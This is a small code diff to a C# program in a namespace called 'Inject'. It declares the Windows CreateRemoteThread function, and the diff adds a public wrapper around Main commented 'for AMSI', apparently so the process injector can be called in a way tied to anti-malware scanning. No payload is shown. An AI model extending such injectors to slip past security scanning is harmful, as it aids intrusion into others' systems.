@@ -20,6 +20,10 @@ namespace Inject
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
+        public static void test(string[] args){ //for AMSI
+            Main(args);
+        }
+
         static void Main(string[] args)
         {
             Console.WriteLine("DEBUG:: OpenProcess");
